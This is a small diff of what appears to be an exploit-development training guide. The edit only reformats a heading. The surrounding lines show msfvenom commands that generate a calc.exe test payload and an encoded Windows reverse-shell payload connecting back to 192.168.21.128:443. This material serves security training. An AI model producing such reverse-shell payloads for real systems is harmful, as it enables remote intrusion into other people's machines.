@@ -63,7 +63,7 @@ For the purpose of the training, we will provide the following options to msfven
 msfvenom -p windows/exec -b '\x00\x0A' \ -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
 ```
 
-**** For reverse shell connection:
+#### For reverse shell connection:
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.21.128 LPORT=443 EXITFUNC=thread  -f c –e x86/shikata_ga_nai -b "\x00\x0a"
 ```
